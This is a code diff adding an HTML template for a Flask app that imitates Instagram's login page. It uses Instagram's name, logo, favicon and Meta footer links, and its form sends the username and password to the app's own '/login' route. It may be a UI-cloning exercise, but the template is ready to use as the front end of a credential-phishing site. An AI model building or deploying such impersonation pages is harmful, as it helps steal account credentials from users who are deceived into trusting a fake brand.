@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" />
+  </head>
+  <body>
+    <main>
+      <div class="log-in-container">
+        <div class="log-in">
+          <!-- Logo -->
+          <img src="static/images/instagram-logo.png" class="logo" />
+          <!-- Log in form -->
+
+          <form action="/login" method="POST" class="log-in-form">
+            <input type="text" name="username" placeholder="Phone number, username or email" />
+            <input type="password" name="password" placeholder="Password" />
+            <button class="log-in-button" type="submit">Log In</button>
+          </form>
+
+          <!-- OR divider -->
+          <span class="or-divider">OR</span>
+          <!-- Log in with Facebook -->
+          <div class="fb-login">
+            <a href="#">
+              <img src="static/images/facebook-icon.png" />
+              <span>Log in with Facebook</span>
+            </a>
+          </div>
+          <!-- Forgot password? -->
+          <a href="#">Forgot password?</a>
+        </div>
+        <!-- Sign up -->
+        <div class="sign-up">
+          <span>Don't have an account?</span><a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+        </div>
+        <!-- Download app -->
+        <div class="get-the-app">
+          <span>Get the app.</span>
+          <div class="app-images">
+            <a href="#"><img src="static/images/applestore.png" /></a>
+            <a href="#"><img src="static/images/googlestore.png" /></a>
+          </div>
+        </div>
+      </div>
+      <!-- Phones -->
+      <div class="phones-container">
+        <img src="static/images/phones.png" />
+      </div>
+    </main>
+    <footer>
+      <ul class="footer-links">
+        <li><a href="https://about.meta.com/">Meta</a></li>
+        <li><a href="https://about.instagram.com/">About</a></li>
+        <li><a href="https://about.instagram.com/blog/">Blog</a></li>
+        <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+        <li><a href="https://help.instagram.com/">Help</a></li>
+        <li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
+        <li><a href="https://privacycenter.instagram.com/policy/">Privacy</a></li>
+        <li><a href="https://help.instagram.com/">Terms</a></li>
+        <li><a href="https://www.instagram.com/explore/locations/">Locations</a></li>
+        <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
+        <li><a href="https://www.threads.net/">Threads</a></li>
+        <li><a href="https://www.facebook.com/help/instagram/261704639352628">Contact uploading and non-users</a></li>
+        <li><a href="https://www.instagram.com/accounts/login">Meta Verified</a></li>
+      </ul>
+      <span class="copyright">&copy; 2024 INSTAGRAM FROM FACEBOOK</span>
+    </footer>
+  </body>
+</html>
